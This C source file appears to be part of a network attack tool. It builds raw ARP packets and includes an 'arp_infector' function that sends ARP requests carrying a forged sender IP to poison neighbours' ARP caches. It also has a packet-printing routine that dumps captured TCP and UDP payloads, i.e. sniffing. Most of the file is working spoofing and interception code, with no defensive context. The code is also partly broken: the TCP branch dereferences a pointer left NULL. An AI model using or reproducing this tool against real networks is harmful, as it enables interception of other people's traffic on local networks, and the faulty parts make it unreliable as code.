#include "lobo.h"

void fill_struct(struct sockaddr_ll* addr)
{
    struct ifreq ifr_st;
    memset(&ifr_st,0,sizeof(struct ifreq));
    strcpy(ifr_st.ifr_name,DEVICE);
    int status;
    int fd=socket(AF_INET,SOCK_STREAM,0);
    status=ioctl(fd,SIOCGIFINDEX,&ifr_st);
    check_function(status,"ioctl");
    addr->sll_ifindex=ifr_st.ifr_ifindex;
    addr->sll_halen=MAC_ADDR_LEN;
    addr->sll_family=AF_PACKET;
    status=ioctl(fd,SIOCGIFHWADDR,&ifr_st);
    check_function(status,"ioctl");
    u_char* ptr=(u_char*)(&ifr_st.ifr_hwaddr.sa_data);
    for(size_t i=0;i<MAC_ADDR_LEN;++i)
    {
        addr->sll_addr[i]=ptr[i];
    }
}

void check_function(const int status,const char* func_name)
{
    if(status==-1)
    {
        fprintf(stderr,"Error of %s calling: %s\n",func_name,strerror(errno));
        exit(EXIT_FAILURE);
    }
}

void fill_buffer(char* buffer,const char* addr,const int fd)
{
    memset(buffer,0,ARP_PACKET_LEN);
    eth_hdr* eth=NULL;
    size_t eth_len=sizeof(eth_hdr);
    
    eth=(eth_hdr*)buffer;
    eth->protocol=htons(ETH_P_ARP);
    for(size_t i=0;i<MAC_ADDR_LEN;++i) eth->dest_addr[i]=0xff;
    struct ifreq ifr_st;
    strcpy(ifr_st.ifr_name,DEVICE);
    int status;
    status=ioctl(fd,SIOCGIFHWADDR,&ifr_st);
    check_function(status,"ioctl");
    u_int8_t* ptr=(u_int8_t*)&ifr_st.ifr_hwaddr.sa_data;
    for(size_t i=0;i<MAC_ADDR_LEN;++i) eth->source_addr[i]=ptr[i];

    arp_hdr* arp=NULL;
    size_t arp_len=sizeof(arp_hdr);
    arp=(arp_hdr*)(buffer+eth_len);
    struct sockaddr_in* addr_st;
    struct hostent* host_st;
    struct in_addr inaddr_st;

    host_st=gethostbyname(addr);
    if(host_st==NULL)
    {
        fprintf(stderr,"Error of gethostbyname calling: %s\n",strerror(errno));
        exit(EXIT_FAILURE);
    }
    inaddr_st=*((struct in_addr*)host_st->h_addr_list[0]);

    arp->hw_type=htons(ARP_HDR_ETHERNET);
    arp->proto_type=htons(ETH_P_IP);
    arp->hw_addr_len=MAC_ADDR_LEN;
    arp->proto_addr_len=IP_ADDR_LEN;
    arp->opt_code=htons(ARP_REQUEST);
    for(size_t i=0;i<MAC_ADDR_LEN;++i) arp->sender_hwaddr[i]=eth->source_addr[i];
    for(size_t i=0;i<MAC_ADDR_LEN;++i) arp->target_hwaddr[i]=0x00;
    status=ioctl(fd,SIOCGIFADDR,&ifr_st);
    check_function(status,"ioctl");
    addr_st=(struct sockaddr_in*)&ifr_st.ifr_addr;
    ptr=(u_int8_t*)&addr_st->sin_addr.s_addr;
    for(size_t i=0;i<IP_ADDR_LEN;++i) arp->sender_ipaddr[i]=ptr[i];
    ptr=(u_int8_t*)&inaddr_st.s_addr;
    for(size_t i=0;i<IP_ADDR_LEN;++i) arp->target_ipaddr[i]=ptr[i];
}

void print_arp(const char* buffer,size_t len)
{
    arp_hdr* arp=NULL;
    size_t arp_len=sizeof(arp_hdr);
    arp=(arp_hdr*)buffer;
    printf("\t**** ARP HEADER ****\n");
    printf("\t\tHw type - %d\n",ntohs(arp->hw_type));
    printf("\t\tProtocol type - 0x%x\n",ntohs(arp->proto_type));
    printf("\t\tHw addr len - %u\n",arp->hw_addr_len);
    printf("\t\tProto addr len - %u\n",arp->proto_addr_len);
    printf("\t\tOpt code - %d\n",ntohs(arp->opt_code));
    printf("\t\tSender MAC - ");
    for(size_t i=0;i<MAC_ADDR_LEN;++i)
    {
        printf("%.2x",arp->sender_hwaddr[i]);
        if(i==MAC_ADDR_LEN-1) printf("\n");
        else printf(":");
    }
    printf("\t\tSender IP - ");
    for(size_t i=0;i<4;++i)
    {
        printf("%u",arp->sender_ipaddr[i]);
        if(i==IP_ADDR_LEN-1) printf("\n");
        else printf(".");
    }
    printf("\t\tTarget MAC - ");
    for(size_t i=0;i<MAC_ADDR_LEN;++i)
    {
        printf("%.2x",arp->target_hwaddr[i]);
        if(i==MAC_ADDR_LEN-1) printf("\n");
        else printf(":");
    }
    printf("\t\tTarget IP - ");
    for(size_t i=0;i<4;++i)
    {
        printf("%u",arp->target_ipaddr[i]);
        if(i==IP_ADDR_LEN-1) printf("\n");
        else printf(".");
    }
}

void arp_infector(const int fd,const char* addr_name,const char* false_addr)
{
    struct sockaddr_ll hunter_addr;
    socklen_t addr_len=sizeof(struct sockaddr_ll);
    memset(&hunter_addr,0,addr_len);
    fill_struct(&hunter_addr);
    char buffer[ARP_PACKET_LEN];
    fill_buffer(buffer,addr_name,fd);
    struct in_addr addr;
    struct hostent* host_st=NULL;
    host_st=gethostbyname(false_addr);
    if(host_st==NULL)
    {
        fprintf(stderr,"Error of gethostbyname calling: %s\n",strerror(errno));
        exit(EXIT_FAILURE);
    }
    addr=*((struct in_addr*)host_st->h_addr_list[0]);
    u_int8_t* ptr=(u_int8_t*)&addr.s_addr;
    arp_hdr* arp=(arp_hdr*)(buffer+sizeof(eth_hdr));
    for(size_t i=0;i<IP_ADDR_LEN;++i) arp->sender_ipaddr[i]=ptr[i];

    int status;
    status=sendto(fd,buffer,ARP_PACKET_LEN,0,(struct sockaddr*)&hunter_addr,addr_len);
    check_function(status,"sendto");
    sleep(1);
}

void print_data(const char* buffer,ssize_t len)
{
    eth_hdr* eth=NULL;
    size_t eth_len=sizeof(eth_hdr);
    size_t data_offset=0;

    printf("**** **** ETHERNET HEADER **** ****\n");
    eth=(eth_hdr*)buffer;
    printf("\t\tProtocol: 0x%x\n",ntohs(eth->protocol));
    printf("\t\tSource hwaddr: ");
    for(size_t i=0;i<MAC_ADDR_LEN;++i) 
    {
        printf("%.2x",eth->source_addr[i]);
        if(i==MAC_ADDR_LEN-1) printf("\n");
        else printf(":");
    }
    printf("\t\tDest hwaddr: ");
    for(size_t i=0;i<MAC_ADDR_LEN;++i)
    {
        printf("%.2x",eth->dest_addr[i]);
        if(i==MAC_ADDR_LEN-1) printf("\n");
        else printf(":");
    }
    data_offset+=eth_len;
    printf("--------------------------------------------------------------------\n");

    if(ntohs(eth->protocol)==ETH_P_IP)
    {
        ip_hdr* ip=NULL;
        size_t ip_len;
        printf("**** **** IP HEADER **** ****\n");
        ip=(ip_hdr*)(buffer+data_offset);
        ip_len=ip->header_lenght<<2;
        printf("\t\tSource addr: %s\n",inet_ntoa(ip->source_addr));
        printf("\t\tDest addr: %s\n",inet_ntoa(ip->dest_addr));
        printf("\t\tProtocol: %u\n",ip->protocol);
        data_offset+=ip_len;
        printf("--------------------------------------------------------------------\n");
        if(ip->protocol==IPPROTO_TCP)
        {
            tcp_hdr* tcp=NULL;
            size_t tcp_len=sizeof(tcp_hdr);
            printf("**** **** TCP HEADER **** ****\n");
            printf("\t\tSource port: %d\n",ntohs(tcp->source_port));
            printf("\t\tDest port: %d\n",ntohs(tcp->dest_port));
            data_offset+=tcp_len;
            printf("--------------------------------------------------------------------\n");
            printf("**** **** DATA **** ****\n\t\t");
            char* data_ptr=(char*)(buffer+data_offset);
            for(size_t i=0;i<len-data_offset;++i)
            {
                printf("%c ",data_ptr[i]);
                if((i+1)%16==0 || i==len-data_offset-1) printf("\n\t\t");
            }
            printf("--------------------------------------------------------------------\n");
        }
        if(ip->protocol==IPPROTO_UDP)
        {
            udp_hdr* udp=NULL;
            size_t udp_len=sizeof(udp_hdr);
            printf("**** **** UDP HEADER **** ****\n");
            udp=(udp_hdr*)(buffer+data_offset);
            printf("\t\tSource port: %d\n",ntohs(udp->source_port));
            printf("\t\tDest port: %d\n",ntohs(udp->dest_port));
            data_offset+=udp_len;
            printf("--------------------------------------------------------------------\n");
            printf("**** **** DATA **** ****\n\t\t");
            char* data_ptr=(char*)(buffer+data_offset);
            for(size_t i=0;i<len-data_offset;++i)
            {
                printf("%c ",data_ptr[i]);
                if((i+1)%16==0 || i==len-data_offset-1) printf("\n\t\t");
            }
            printf("--------------------------------------------------------------------\n");
        }
    }
}